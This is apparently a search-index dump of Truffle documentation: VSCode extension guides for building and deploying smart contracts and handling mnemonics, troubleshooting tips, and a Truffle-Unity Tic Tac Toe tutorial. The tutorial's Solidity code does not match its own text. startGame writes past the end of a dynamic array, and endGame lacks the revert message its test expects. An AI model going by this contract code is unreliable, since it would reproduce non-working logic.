the developer to Create Basic Project or Create Project from Truffle box . Create Basic Project scaffolds out a simple Truffle-compatible directory structure including a sample HelloBlockchain.sol contract, deployment (migration) files, a basic contract test framework, and basic files for GitHub integration. This smart contract directory is ready to build and deploy to a network. Import smart contract libraries \u00b6 We recommend using the npm or Yarn package manager to handle contract dependencies allowing you to have version control across your dependent contracts. The OpenZeppelin smart contracts library includes secure implementations of standards such as ERC-20 and useful functions such as safe-math and Gas Station Network (GSN). To use the OpenZeppelin library in your project, install OpenZeppelin on the command line in the root of the project: npm install @openzeppelin/contracts Or: yarn add @openzeppelin/contracts Build a smart contract \u00b6 The basic contract included in the basic project is ready to be built and deployed as is. You can edit this contract to fit your needs. Build your smart contract by doing one of the following: In the command palette , select Truffle: Build Contracts . Select your contract Solidity ( .sol ) file, right-click and select Build Contracts . Once compiled, you have your contract, contract metadata (contract ABI, bytecode, etc.) available in the build directory. The build artifacts and directory structure use Truffle Suite and are compatible with any Truffle automation or scripts that depend on that framework. Deploy a smart contract \u00b6 Once you've built your contract, you can activate the deployment process manually by doing one of the following: In the command palette , select Truffle: Deploy Contracts . Select your contract Solidity ( .sol ) file, right-click and select Deploy Contracts . Alternatively, you can automatically activate the deployment process upon saving your contract by turning on Contract Auto Deploy on the blue status bar at the bottom of the screen. Once activated, the deployment process gives users the option to deploy a contract locally or to an Ethereum network . Deployment parameters are based on the Truffle migrations process, and are defined and managed in the truffle-config.js file. Local deployment \u00b6 If you haven't already connected to any other network, the default option allows you to deploy your contract to an emulated Ethereum network powered by Ganache . Select the development network to deploy your contract to a local network. Deployment information, such as contract address, transaction hash, and other metadata are published in the Truffle for VSCode output channel. Important output parameters include: Contract address - The address of the deployed contract on the ledger. You may use this contract address to interact with your contract functions. Account - The account used to sign/send the contract. This account is autogenerated. Balance, gas, value, and cost - Ganache is an Ethereum emulator, so it emulates the functions/parameters needed to send contracts to the public network. These functions/parameters include ETH and other parameters that apply to public networks. Total deployments - Number of deployments. Generate a new key \u00b6 You can generate a new key automatically. The extension asks you to save the key in a file with a .env extension. Paste an existing mnemonic \u00b6 If you have previous keys generated in a tool such as MetaMask , you can reuse the keys by pasting the 12-word phrase. The extension asks developers who have pasted their mnemonic where they want to store the file (as a .env file). If you're testing with several existing keys stored in files on the development machine, the extension shows the first/last three characters of the 12-word phrase, and the location of the .env file on disk. Deploy to an Ethereum network \u00b6 Truffle for VSCode supports connecting to public Ethereum networks using Infura . To connect to a public network and deploy a contract: In the command palette , select Truffle: Sign into Infura account . Sign into or create your Infura account. In the Blockchain Networks tab, select the ellipsis in the top right corner and connect to or create an Infura project. The extension updates your truffle-config.js to include the connection strings for each destination. Deployment of a contract to Ethereum follows the same steps as a local deployment . Important : The mnemonic used in this step must be the same one associated with your Ethereum user account. Replace the 12-word mnemonic with a valid one and use caution when sharing this project with others to avoid exposing the mnemonic/account information. After setting up your truffle-config.js with the proper account information and deploying to a network, you can see the results of your transaction in the Truffle for VSCode output channel.", "title": "Manage smart contracts"}, {"location": "docs/vscode-ext/how-to/manage-smart-contracts/#manage-smart-contracts", "text": "Truffle for VSCode allows developers to quickly scaffold out a directory with a basic smart contract and key files needed to deploy contracts locally or to public Ethereum networks. This page provides instructions on creating, building, and deploying smart contracts.", "title": "Manage smart contracts"}, {"location": "docs/vscode-ext/how-to/manage-smart-contracts/#create-a-new-solidity-project", "text": "In the command palette , select Truffle: New Solidity Project . The extension asks the developer to Create Basic Project or Create Project from Truffle box . Create Basic Project scaffolds out a simple Truffle-compatible directory structure including a sample HelloBlockchain.sol contract, deployment (migration) files, a basic contract test framework, and basic files for GitHub integration. This smart contract directory is ready to build and deploy to a network.", "title": "Create a new Solidity project"}, {"location": "docs/vscode-ext/how-to/manage-smart-contracts/#import-smart-contract-libraries", "text": "We recommend using the npm or Yarn package manager to handle contract dependencies allowing you to have version control across your dependent contracts. The OpenZeppelin smart contracts library includes secure implementations of standards such as ERC-20 and useful functions such as safe-math and Gas Station Network (GSN). To use the OpenZeppelin library in your project, install OpenZeppelin on the command line in the root of the project: npm install @openzeppelin/contracts Or: yarn add @openzeppelin/contracts", "title": "Import smart contract libraries"}, {"location": "docs/vscode-ext/how-to/manage-smart-contracts/#build-a-smart-contract", "text": "The basic contract included in the basic project is ready to be built and deployed as is. You can edit this contract to fit your needs. Build your smart contract by doing one of the following: In the command palette , select Truffle: Build Contracts . Select your contract Solidity ( .sol ) file, right-click and select Build Contracts . Once compiled, you have your contract, contract metadata (contract ABI, bytecode, etc.) available in the build directory. The build artifacts and directory structure use Truffle Suite and are compatible with any Truffle automation or scripts that depend on that framework.", "title": "Build a smart contract"}, {"location": "docs/vscode-ext/how-to/manage-smart-contracts/#deploy-a-smart-contract", "text": "Once you've built your contract, you can activate the deployment process manually by doing one of the following: In the command palette , select Truffle: Deploy Contracts . Select your contract Solidity ( .sol ) file, right-click and select Deploy Contracts . Alternatively, you can automatically activate the deployment process upon saving your contract by turning on Contract Auto Deploy on the blue status bar at the bottom of the screen. Once activated, the deployment process gives users the option to deploy a contract locally or to an Ethereum network . Deployment parameters are based on the Truffle migrations process, and are defined and managed in the truffle-config.js file.", "title": "Deploy a smart contract"}, {"location": "docs/vscode-ext/how-to/manage-smart-contracts/#local-deployment", "text": "If you haven't already connected to any other network, the default option allows you to deploy your contract to an emulated Ethereum network powered by Ganache . Select the development network to deploy your contract to a local network. Deployment information, such as contract address, transaction hash, and other metadata are published in the Truffle for VSCode output channel. Important output parameters include: Contract address - The address of the deployed contract on the ledger. You may use this contract address to interact with your contract functions. Account - The account used to sign/send the contract. This account is autogenerated. Balance, gas, value, and cost - Ganache is an Ethereum emulator, so it emulates the functions/parameters needed to send contracts to the public network. These functions/parameters include ETH and other parameters that apply to public networks. Total deployments - Number of deployments.", "title": "Local deployment"}, {"location": "docs/vscode-ext/how-to/manage-smart-contracts/#generate-a-new-key", "text": "You can generate a new key automatically. The extension asks you to save the key in a file with a .env extension.", "title": "Generate a new key"}, {"location": "docs/vscode-ext/how-to/manage-smart-contracts/#paste-an-existing-mnemonic", "text": "If you have previous keys generated in a tool such as MetaMask , you can reuse the keys by pasting the 12-word phrase. The extension asks developers who have pasted their mnemonic where they want to store the file (as a .env file). If you're testing with several existing keys stored in files on the development machine, the extension shows the first/last three characters of the 12-word phrase, and the location of the .env file on disk.", "title": "Paste an existing mnemonic"}, {"location": "docs/vscode-ext/how-to/manage-smart-contracts/#deploy-to-an-ethereum-network", "text": "Truffle for VSCode supports connecting to public Ethereum networks using Infura . To connect to a public network and deploy a contract: In the command palette , select Truffle: Sign into Infura account . Sign into or create your Infura account. In the Blockchain Networks tab, select the ellipsis in the top right corner and connect to or create an Infura project. The extension updates your truffle-config.js to include the connection strings for each destination. Deployment of a contract to Ethereum follows the same steps as a local deployment . Important : The mnemonic used in this step must be the same one associated with your Ethereum user account. Replace the 12-word mnemonic with a valid one and use caution when sharing this project with others to avoid exposing the mnemonic/account information. After setting up your truffle-config.js with the proper account information and deploying to a network, you can see the results of your transaction in the Truffle for VSCode output channel.", "title": "Deploy to an Ethereum network"}, {"location": "docs/vscode-ext/how-to/troubleshoot/", "text": "Troubleshoot \u00b6 This page provides troubleshooting information for common issues. Missing or old version of Python \u00b6 If you've installed all dependencies, but still get the \"missing\" or \"old version\" notification for Python, you likely have installed Python without adding it to your system PATH variable (the default installation mode of Python). To resolve this problem, you must add your Python directory to the system path. You can do this by editing your PATH variable directly, or by fixing your Python installation. Add your Python directory to your PATH variable directly \u00b6 On Windows, edit your PATH variable by going to the Windows search bar and typing env . Once the System Properties panel launches, select Environment Variables . In the Environment Variables editor, select the Path and Edit . Select New to add a new entry to your PATH, then type C:\\Python27\\ (or whichever directory you installed Python to), and select OK to save. To verify your changes, open a new command prompt and enter python --version . Fix your Python installation \u00b6 On Windows, edit your PATH variable by going to the Windows search bar and typing add . Scroll down to your Python installation and select modify . In the Python dialog box, select Change Python . Scroll down and select the red X next to Add python.exe to Path , then select Will be installed on local hard drive . Select Next . To verify your changes, open up a command prompt and enter python --version . Git client not installed \u00b6 If you've installed Git but get prompted that the Git client isn't installed, you likely need to add it to your system PATH variable. You must update the path manually: On Windows, edit your PATH variable by going to the Windows search bar and typing env . Once the System Properties panel launches, select Environment Variables . In the Environment Variables editor, select Path and Edit . Select New to add a new entry to your PATH, then type C:\\Program Files\\Git\\bin\\ (or whichever directory you installed Git to), and select OK to save. Errors upon creating a project \u00b6 If you're getting errors when creating a new project, this might be caused by a dependency that requires a C++ compiler to be installed. On Windows, you can resolve this with a build tools installation. Open a Powershell shell under administrator rights, and run the following command: npm install --global windows-build-tools Note : This installation takes a few minutes to install.`", "title": "Troubleshoot"}, {"location": "docs/vscode-ext/how-to/troubleshoot/#troubleshoot", "text": "This page provides troubleshooting information for common issues.", "title": "Troubleshoot"}, {"location": "docs/vscode-ext/how-to/troubleshoot/#missing-or-old-version-of-python", "text": "If you've installed all dependencies, but still get the \"missing\" or \"old version\" notification for Python, you likely have installed Python without adding it to your system PATH variable (the default installation mode of Python). To resolve this problem, you must add your Python directory to the system path. You can do this by editing your PATH variable directly, or by fixing your Python installation.", "title": "Missing or old version of Python"}, {"location": "docs/vscode-ext/how-to/troubleshoot/#add-your-python-directory-to-your-path-variable-directly", "text": "On Windows, edit your PATH variable by going to the Windows search bar and typing env . Once the System Properties panel launches, select Environment Variables . In the Environment Variables editor, select the Path and Edit . Select New to add a new entry to your PATH, then type C:\\Python27\\ (or whichever directory you installed Python to), and select OK to save. To verify your changes, open a new command prompt and enter python --version .", "title": "Add your Python directory to your PATH variable directly"}, {"location": "docs/vscode-ext/how-to/troubleshoot/#fix-your-python-installation", "text": "On Windows, edit your PATH variable by going to the Windows search bar and typing add . Scroll down to your Python installation and select modify . In the Python dialog box, select Change Python . Scroll down and select the red X next to Add python.exe to Path , then select Will be installed on local hard drive . Select Next . To verify your changes, open up a command prompt and enter python --version .", "title": "Fix your Python installation"}, {"location": "docs/vscode-ext/how-to/troubleshoot/#git-client-not-installed", "text": "If you've installed Git but get prompted that the Git client isn't installed, you likely need to add it to your system PATH variable. You must update the path manually: On Windows, edit your PATH variable by going to the Windows search bar and typing env . Once the System Properties panel launches, select Environment Variables . In the Environment Variables editor, select Path and Edit . Select New to add a new entry to your PATH, then type C:\\Program Files\\Git\\bin\\ (or whichever directory you installed Git to), and select OK to save.", "title": "Git client not installed"}, {"location": "docs/vscode-ext/how-to/troubleshoot/#errors-upon-creating-a-project", "text": "If you're getting errors when creating a new project, this might be caused by a dependency that requires a C++ compiler to be installed. On Windows, you can resolve this with a build tools installation. Open a Powershell shell under administrator rights, and run the following command: npm install --global windows-build-tools Note : This installation takes a few minutes to install.`", "title": "Errors upon creating a project"}, {"location": "docs/vscode-ext/reference/command-palette/", "text": ".md-typeset table:not([class]) { background-color: var(--md-primary-fg-color); } Command palette \u00b6 Truffle for VSCode provides several commands for interacting with ledgers, and building, compiling, and testing your smart contracts. These features are enabled through the command palette and several right-click shortcut menus. To access the command palette, select View, Command Palette from the VSCode menu, or press ctrl+shift+p . Commands \u00b6 Command name Description Truffle: Build Contracts Builds/compiles all contracts in the contracts directory. Truffle: Deploy Contracts Deploys a smart contract to a local Ganache network, or a public Ethereum network. Truffle: New Solidity Project Scaffolds out a basic (default) smart contract folder structure. Includes simple contract ( .sol ), Truffle config files and GitHub readiness (e.g., README ). You can choose to unbox a Truffle box to get access to specific examples hosted by Truffle. Truffle: Start Ganache Server Starts a local Ethereum emulator - Truffle's Ganache command line server ( Ganache-cli ). This server allows developers to deploy contracts to a local network which emulates a public blockchain node. Truffle: Stop Ganache Server Stops the local Ganache Ethereum emulator. Truffle: Show Welcome Page Opens the default Welcome Page which contains simple examples and links to online resources specific to Truffle for VSCode. Right-click shortcuts \u00b6 Command name Context Description Copy Access Key Right-click on your Blockchain Service Node. Inserts the access key for your node into the copy/paste buffer. Copy Contract ABI Right-click on contract .json after compiling. Copies the contract ABI into your copy/paste buffer. Copy Contract Bytecode Right-click on contract .json after compiling. Copies the contract Bytecode into your copy/paste buffer. Copy RPC Endpoint Address Right-click on your Node. Inserts the RPC endpoint address for your node into the copy/paste buffer. Deploy Contracts Right-click on your contract .sol or contract .json after compiling. Deploys your contract to the selected destination.", "title": "Command palette"}, {"location": "docs/vscode-ext/reference/command-palette/#command-palette", "text": "Truffle for VSCode provides several commands for interacting with ledgers, and building, compiling, and testing your smart contracts. These features are enabled through the command palette and several right-click shortcut menus. To access the command palette, select View, Command Palette from the VSCode menu, or press ctrl+shift+p .", "title": "Command palette"}, {"location": "docs/vscode-ext/reference/command-palette/#commands", "text": "Command name Description Truffle: Build Contracts Builds/compiles all contracts in the contracts directory. Truffle: Deploy Contracts Deploys a smart contract to a local Ganache network, or a public Ethereum network. Truffle: New Solidity Project Scaffolds out a basic (default) smart contract folder structure. Includes simple contract ( .sol ), Truffle config files and GitHub readiness (e.g., README ). You can choose to unbox a Truffle box to get access to specific examples hosted by Truffle. Truffle: Start Ganache Server Starts a local Ethereum emulator - Truffle's Ganache command line server ( Ganache-cli ). This server allows developers to deploy contracts to a local network which emulates a public blockchain node. Truffle: Stop Ganache Server Stops the local Ganache Ethereum emulator. Truffle: Show Welcome Page Opens the default Welcome Page which contains simple examples and links to online resources specific to Truffle for VSCode.", "title": "Commands"}, {"location": "docs/vscode-ext/reference/command-palette/#right-click-shortcuts", "text": "Command name Context Description Copy Access Key Right-click on your Blockchain Service Node. Inserts the access key for your node into the copy/paste buffer. Copy Contract ABI Right-click on contract .json after compiling. Copies the contract ABI into your copy/paste buffer. Copy Contract Bytecode Right-click on contract .json after compiling. Copies the contract Bytecode into your copy/paste buffer. Copy RPC Endpoint Address Right-click on your Node. Inserts the RPC endpoint address for your node into the copy/paste buffer. Deploy Contracts Right-click on your contract .sol or contract .json after compiling. Deploys your contract to the selected destination.", "title": "Right-click shortcuts"}, {"location": "drizzle/", "text": "", "title": "Drizzle"}, {"location": "events/", "text": "", "title": "Truffle Events"}, {"location": "ganache/", "text": "", "title": "Ganache"}, {"location": "ganache/overview/", "text": "Redirect to /docs/ganache", "title": "Index"}, {"location": "guides/", "text": "", "title": "Truffle Guides"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/", "text": "Building a Tic Tac Toe Game with Truffle and Unity \u00b6 Written by Josh Quintal and Emily Lin Last updated 3/31/2023 Unity is a powerful game engine. Truffle is a powerful smart contract framework. Let's combine both to make something cool! We'll be going over the Truffle Unity Box, which contains the basic code for a web3 Tic Tac Toe game that: Uses a simple smart contract that locks and releases jackpot winnings to players of a Tic Tac Toe game Uses a Truffle plugin that will automatically generate C# artifacts for your smart contracts Connects a game master\u2019s mobile MetaMask wallet to provide prize money using the MetaMask SDK This tutorial assumes you have basic familiarity with building with the Unity game engine. We'll be deploying on Linea, an EVM equivalent, zero-knowledge rollup, to take advantage of its lower gas fees and faster transaction times, which are crucial to game development. Let's dive in! Prerequisites: \u00b6 There are a few tools you'll need to download: Unity : Unity is a game engine. NEthereum : NEthereum allows us to interact with the Ethereum blockchain in C#. Truffle CLI : Truffle CLI manages the lifecycle of our smart contracts. It handles compiling our Solidity and producing artifact files, JSON files which contain the function signatures for a given contract. We'll ingest these artifacts using the MetaMask SDK and NEtherem so we can interact with our smart contract in Unity. Ganache : Ganache spins up a local test chain for you to test your smart contracts locally. MetaMask wallet as both an extension and on mobile Make sure that Linea is set up as a network on both platforms Goerli Eth Linea Goerli Eth ConsenSys has a number of tools in the Unity asset store that will help you create any web3 gaming experience you can imagine. Another one you may want to check out is the Infura Unity SDK . This allows you to qucickly work with NFTs; querying collections, minting new NFTs, transferring them and more, without doing any smart contract development! Unbox the Truffle Unity Box \u00b6 To unbox the Truffle Unity box, and store the game code in a folder called game , run: truffle unbox unity game The Unity box is split into two folders: truffle , for storing smart contracts unity , for storing the game files First, let's dive into the smart contract! The Smart Contract \u00b6 The smart contract powering the game can be found at contracts/TicTacToe.sol . This contract allows for the creation of tic tac toe games represented by an ID, jackpot, and payout addresses of the 2 players involved. It also keeps track of a game's status, and whether or not its ended. Once a game ends the jackpot is released for the winner to withdraw at their convenience. Let's break it down in sections to understand exactly what's happening. Imports and Variables \u00b6 import \"@openzeppelin/contracts/security/PullPayment.sol\" ; contract TicTacToe is PullPayment { event GameStarted ( uint game_id ); event GameWon ( address winner , uint amount ); struct Game { uint jackpot ; address [ 2 ] payout_addresses ; bool ended ; } Game [] games ; ... } We import OpenZeppelin's PullPayment contract for safe processing of withdrawals for the winner. In Ethereum a best practice is to have users withdraw funds rather than sending them automatically. We have 2 events: GameStarted, which fires when a game starts, and GameWon, which fires when a game ends in a win. If a game ends in a draw, it will not fire this event because nothing related to the smart contract needs to occur. Each game is represented by a Game struct. It has a jackpot amount supplied by the user, an array containing the addresses of the players (X & O), and a boolean letting us know if this game has ended. Finally, we keep an array of Games so that we can quickly access them by ID, which in this case is their index in the games array. Starting a Game \u00b6 function startGame ( address payout_x , address payout_o ) public payable { // must have some value attached for jackpot require ( msg.value > 0 , \"jackpot must be greater than 0\" ); // all params must be supplied require ( payout_x != address ( 0 ), \"player X address cannot be empty\" ); require ( payout_o != address ( 0 ), \"player O address cannot be empty\" ); // msg.sender and payout_o cannot be the same address require ( payout_x != payout_o , \"player X and player O cannot have the same payout address\" ); uint new_game_id = games . length ; address [ 2 ] memory payout_addresses = [ payout_x , payout_o ]; games [ new_game_id ] = Game ( msg.value , payout_addresses , false ); emit GameStarted ( new_game_id ); } To start a game, we need to know the jackpot amount (supplied as msg.value ) and the address of the players involved for payout. We check that those values are set and that the two payout addresses are not equal. Our contract assumes a \"game master\" will setup the game and deposit the necessary jackpot funds, which then get paid out to the winner. We then get the ID for our new game which, thanks to using an array, is the current length. We then pass these variables into a new Game object and emit our GameStarted() event. Ending a Game \u00b6 function endGame ( uint game_id , uint winner ) public { // make sure the game hasn't already ended require ( ! games [ game_id ]. ended ); address winner_address = games [ game_id ]. payout_addresses [ winner ]; uint jackpot = games [ game_id ]. jackpot ; games [ game_id ]. ended = true ; _asyncTransfer ( winner_address , jackpot ); emit GameWon ( winner_address , jackpot ); } To end a game, we first make sure the game we're attempting to end hasn't already been ended. This single line is supremely important. Because this is a smart contract hosted on a public blockchain, anyone could call this contract outside of the game. Because of this, we check our game's state to make sure this can't be used to potentially trigger unlimited withdrawals. We then add the winner's address to the winners array so that we can efficiently build the leaderboard. From there, we get the winner's address and the jackpot so that we can call _asyncTransfer() . This function comes from the OpenZeppelin contract we imported, and it handles the payouts for us. The winner can now call a payout function to withdraw their funds safely. In the case that this player has won multiple times, this function will automatically aggregate their winnings. Finally, we emit out GameWon() event. Compile the Smart Contract \u00b6 Note that compiling the contracts only works if the build directory unity/Assets/Contracts/json does NOT include .meta files, which are created automatically by the Unity game engine. If they exist, simply delete the build directory. Then, run: cd truffle npm i truffle compile Testing the Smart Contract \u00b6 Now that we've written our smart contract, it's time to test! The test file can be found at test/tictactoe.js . Here we'll breakdown the tests. Throughout all of these tests, we make use of Rosco Kalis' Truffle Assertions library . It makes it easy to test event emissions and reversion! Pre-Start Tests \u00b6 In this series of tests we look at all of the invalid conditions that could occur before a game starts. We need 2 things to start a game: a jackpot and 2 players. We ensure both of those things, as well as that the 2 players, represented in this smart contract as 2 payout addresses, are unique. it ( \"should not start a new game without a jackpot\" , async () => { const ticTacToeInstance = await TicTacToe . deployed (); await truffleAssert . reverts ( ticTacToeInstance . startGame ( accounts [ 0 ], accounts [ 1 ]), \"jackpot must be greater than 0\" ); }); it ( \"should not start a new game with an empty payout_x address\" , async () => { const ticTacToeInstance = await TicTacToe . deployed (); await truffleAssert . reverts ( ticTacToeInstance . startGame ( \"0x0000000000000000000000000000000000000000\" , accounts [ 1 ], { value : 100 } ), \"player X address cannot be empty\" ); }); it ( \"should not start a new game with an empty payout_o address\" , async () => { const ticTacToeInstance = await TicTacToe . deployed (); await truffleAssert . reverts ( ticTacToeInstance . startGame ( accounts [ 0 ], \"0x0000000000000000000000000000000000000000\" , { value : 100 } ), \"player O address cannot be empty\" ); }); it ( \"should not start a new game with 2 equal payout addresses\" , async () => { const ticTacToeInstance = await TicTacToe . deployed (); await truffleAssert . reverts ( ticTacToeInstance . startGame ( accounts [ 0 ], accounts [ 0 ], { value : 100 }), \"player X and player O cannot have the same payout address\" ); }); Post-Start Tests \u00b6 Not much can go wrong once a game has started. Once a game ends, however, payment is released to the winning address. We want to make very sure that a game which has ended cannot be ended again. If that were possible, an attacker could potentially drain the contract of funds by ending a game they've won continuously until funds are gone. it ( \"should not end game which has already ended\" , async () => { const ticTacToeInstance = await TicTacToe . deployed (); const tx = await ticTacToeInstance . startGame ( accounts [ 0 ], accounts [ 1 ], { value : 100 , }); await ticTacToeInstance . endGame ( 0 , 0 ); await truffleAssert . reverts ( ticTacToeInstance . endGame ( 0 , 0 ), \"cannot end a game which is already ended\" ); }); Happy Path Tests \u00b6 Finally, we want to make sure that when everything goes as expected, the game actually works. A new game should start with a jackpot and 2 valid payout addresses. Importantly, a winner should be able to withdraw their winnings once a game has ended. We've imported most of this functionality from OpenZeppelin's PullPayment contract , so we just test that our implementation in the TicTacToe contract works as expected. it ( \"should start a new game with all parameters supplied\" , async () => { const ticTacToeInstance = await TicTacToe . deployed (); const tx = await ticTacToeInstance . startGame ( accounts [ 0 ], accounts [ 1 ], { value : 100 , }); truffleAssert . eventEmitted ( tx , \"GameStarted\" ); }); it ( \"should end a game if one exists\" , async () => { const ticTacToeInstance = await TicTacToe . deployed (); const tx = await ticTacToeInstance . endGame ( 1 , 1 ); truffleAssert . eventEmitted ( tx , \"GameWon\" ); }); it ( \"should allow withdrawal if an address has winnings\" , async () => { const ticTacToeInstance = await TicTacToe . deployed (); const oldBalance = await web3 . eth . getBalance ( accounts [ 1 ]); await ticTacToeInstance . withdrawPayments ( accounts [ 1 ]); const newBalance = await web3 . eth . getBalance ( accounts [ 1 ]); assert . equal ( parseInt ( oldBalance ) + 100 , parseInt ( newBalance ), \"winner balance changed an unanticipated amount after withdrawal\" ); }); Run the tests \u00b6 Note that running the tests only works if the build directory unity/Assets/Contracts/json does NOT include .meta files, which are created automatically by the Unity game engine. If they exist, simply delete the build directory. Then, to ensure that our smart contract is working, we can simply run the tests by running truffle test . Your output should look a little something like this: Compiling your contracts... =========================== > Compiling ./contracts/TicTacToe.sol > Compiling @openzeppelin/contracts/access/Ownable.sol > Compiling @openzeppelin/contracts/security/PullPayment.sol > Compiling @openzeppelin/contracts/utils/Address.sol > Compiling @openzeppelin/contracts/utils/Context.sol > Compiling @openzeppelin/contracts/utils/escrow/Escrow.sol > Artifacts written to /var/folders/bj/n7fv7n9j33l8_8t4c9ygct7w0000gn/T/test--83647-z48oHcJghUH3 > Compiled successfully using: - solc: 0 .8.18+commit.87f61d96.Emscripten.clang Contract: TicTacToe \u2714 should not start a new game without a jackpot ( 108ms ) \u2714 should not start a new game with an empty payout_x address \u2714 should not start a new game with an empty payout_o address \u2714 should not start a new game with 2 equal payout addresses \u2714 should not end game which has already ended ( 105ms ) \u2714 should start a new game with all parameters supplied ( 67ms ) \u2714 should end a game if one exists \u2714 should allow withdrawal if an address has winnings ( 58ms ) 8 passing ( 448ms ) Using Unity and Truffle Together \u00b6 Now, it's time to open up the Unity engine! In order to interact with the TicTacToe smart contract in the Unity game, we have to use MetaMask mobile, which cannot connect to a local testchain. Instead, we'll have to deploy the contract to a public testnet. Deploy to Linea using Truffle Dashboard \u00b6 Deploying to Linea is simple with Truffle Dashboard. First, run this command to open up Dashboard on localhost:24012 : truffle dashboard Make sure your MetaMask wallet is connected to Linea. Then, migrate your contracts: truffle migrate --network dashboard You should see an approval request to deploy the contract in Dashboard. Confirm the transaction. Your output should look similar to this: Compiling your contracts... =========================== > Compiling ./contracts/TicTacToe.sol > Compiling @openzeppelin/contracts/access/Ownable.sol > Compiling @openzeppelin/contracts/security/PullPayment.sol > Compiling @openzeppelin/contracts/utils/Address.sol > Compiling @openzeppelin/contracts/utils/Context.sol > Compiling @openzeppelin/contracts/utils/escrow/Escrow.sol > Artifacts written to /Users/emilylin/dev/demos/unity/unity/Assets/Contracts/json > Compiled successfully using: - solc: 0 .8.18+commit.87f61d96.Emscripten.clang Starting migrations... ====================== > Network name: 'dashboard' > Network id: 59140 > Block gas limit: 30000000 ( 0x1c9c380 ) 1_ttt.js ======== Deploying 'TicTacToe' --------------------- > transaction hash: 0xb9820cf99a77c5730f651209743531d81497c9e17abec93db7da3d95e9b20fb2sage. > Blocks: 1 Seconds: 16 > contract address: 0x1bBafDeD286635aF0176A27133aCC8a05E3179D2 > block number: 385733 > block timestamp: 1680385169 > account: YOUR_ACCOUNT_NUMBER > balance: 2000 .037039652445354678 > gas used: 1420448 ( 0x15aca0 ) > gas price: 2 .500000007 gwei > value sent: 0 ETH > total cost: 0 .003551120009943136 ETH > Saving artifacts ------------------------------------- > Total cost: 0 .003551120009943136 ETH Summary ======= > Total deployments: 1 > Final cost: 0 .003551120009943136 ETH Save off the deployed contract address! You can find more detailed instructions here . Modify Assets/Contracts/ContractManager.cs \u00b6 We'll be referencing the contract address in multiple places throughout the Unity code. So, we've created a global variable ticTacToeAddress in Assets/Contracts/ContractManager.cs . Update that variable with your deployed contract address. public class ContractManager { public static string ticTacToeAddress = \"0x1bBafDeD286635aF0176A27133aCC8a05E3179D2\" ; } Open the Project in Unity \u00b6 We'll be editing the Unity files in the Unity Hub. First, start Unity Hub. Then, open a project from disk: You'll want to select just the unity folder: Your view should look like this: Click on the project to open it. Ignore the Unity version update for now. Generating C# to Use Smart Contracts in Unity \u00b6 This repo already contains the Truffle Unity plugin , which automatically builds the necessary C# classes using NEthereum for interfacing with your smart contracts in Unity. You can manually add the contract artifact files to your Unity project, which will trigger the build, but in most cases, we recommend setting the contracts build directory to the desired directory in your Unity project. As you can see below, the contracts_build_directory is already pointing to a folder under the unity folder. // truffle-config.js module . exports = { contracts_build_directory : \"../unity/Assets/Contracts/json\" ... } This would be the directory structure in the unity/Assets folder once the contracts have been compiled in Truffle and the C# build completes: \u251c Contracts \u2502 \u251c csharp \u2502 \u2514 json The Truffle artifacts are in the json folder: And you can find the corresponding C# classes in csharp . We'll be interacting with the classes generated under csharp/contracts : Update the Scenes \u00b6 In order to for Unity to recognize the new contract artifacts. We have to force a rebuild of our scenes. To do this, you can move the Menu 1 and TicTacToe 1 folders out of the scenes folder, and then move them back into the scenes folder. This should trigger a reload of the script assemblies. Ensure that Menu 1 becomes Menu 2 and TicTacToe 1 becomes TicTacToe 2 . Connect your MetaMask wallet \u00b6 Now that we've created the necessary C# files for the Unity game, let's look at how we connect our MetaMask wallet. To start a game, the very first action the gamemaster needs to do is to connect their wallet so that they can lock up the jackpot money. We'll change our MetaMask mobile network to Linea, since we deployed our contract on Linea. You can find the MetaMask Unity SDK documentation here . The wallet connection code can be found in ConnectMetaMaskUI.cs . We use this script by adding it as a component of ConnectionCanvas and calling Connect() on the ConnectionButton . You can find and modify these properties by right clicking the canvas and selecting properties : And find the script: And find onClick : Interacting with Smart Contracts in Unity \u00b6 Now that we've hooked up connecting our wallet, let's walk through an example of interacting with a smart contract. When we start a game, we want to call the function startGame from TicTacToe.sol . In order to do this, we will use the generated StartGameRequestAndWaitForReceiptAsync function from unity/Assets/Contracts/csharp/Contracts/TicTacToeService.cs . We will be using this in the InitializeGame function in NewGameMenu.cs . To reference the deployed contract, we need to create an instance of of web3, as well as reference the global address we changed earlier: var metaMask = MetaMaskUnity . Instance ; var web3 = metaMask . CreateWeb3 (); var ticTacToeAddress = ContractManager . ticTacToeAddress ; var ticTacToe = new Truffle . Contracts . TicTacToeService ( web3 , ticTacToeAddress ); StartGameFunction is an autogenerated C# class found under csharp/Functions . We will use this to pass in the necessary parameters to the startGame function in TicTacToe.sol : // This is in StartGameFunction.cs public class StartGameFunctionBase : FunctionMessage { [Parameter(\"address\", \"payout_x\", 1)] public virtual string PayoutX { get ; set ; } [Parameter(\"address\", \"payout_o\", 2)] public virtual string PayoutO { get ; set ; } } Then, as you can see back in NewGameMenu.cs , we pass in startGameFunction to the autogenerated StartGameRequestAndWaitForReceiptAsync function to actually call the smart contract function. Note that we want to pass in a certain amount of ETH to be added to the jackpot. We do this by adding AmountToSend to startGameFunction . // We create the StartGameFunction object so we can attach ETH via AmountToSend. var startGameFunction = new Truffle . Functions . StartGameFunction (); startGameFunction . AmountToSend = jackpotInt ; startGameFunction . PayoutX = playerXValue ; startGameFunction . PayoutO = playerOValue ; try { var receipt = await ticTacToe . StartGameRequestAndWaitForReceiptAsync ( startGameFunction ); ... } As we saw in ConnectionCanvas properties, we can also see this script being utilized in NewGameCanvas : And the game being started via ValidateForm in PlayButton properties: There are many instances where we are calling the auto-generated csharp smart contract functions. Feel free to peruse around the code to get a better feel of the usage. Play the game \u00b6 That was a lot to cover! Here's a short video clip of running through this entire process. Do note that the wallet connection portion is not screen recorded since we are connecting through mobile. Continue the conversation \u00b6 And there you have it - a brief overview of the Truffle Unity box. Ask questions on GitHub discussions and join our Discord under #truffle-general to talk about what games you're building!", "title": "Building a Tic Tac Toe Game with Truffle and Unity"}, {"location": "guides/building-a-tic-tac-toe-game-with-truffle-and-unity/#building-a-tic-tac-toe-game-with-truffle-and-unity", "text": "Written by Josh Quintal and Emily Lin Last updated 3/31/2023 Unity is a powerful game engine. Truffle is a powerful smart contract framework. Let's combine both to make something cool! We'll be going over the Truffle Unity Box, which contains the basic code for a web3 Tic Tac Toe game that: Uses a simple smart contract that locks and releases jackpot winnings to players of a Tic Tac Toe game Uses a Truffle plugin that will automatically generate C# artifacts for your smart contracts Connects a game master\u2019s mobile MetaMask wallet to provide prize money using the MetaMask SDK This tutorial assumes you have basic familiarity with building with the Unity game engine. We'll be deploying on Linea, an EVM 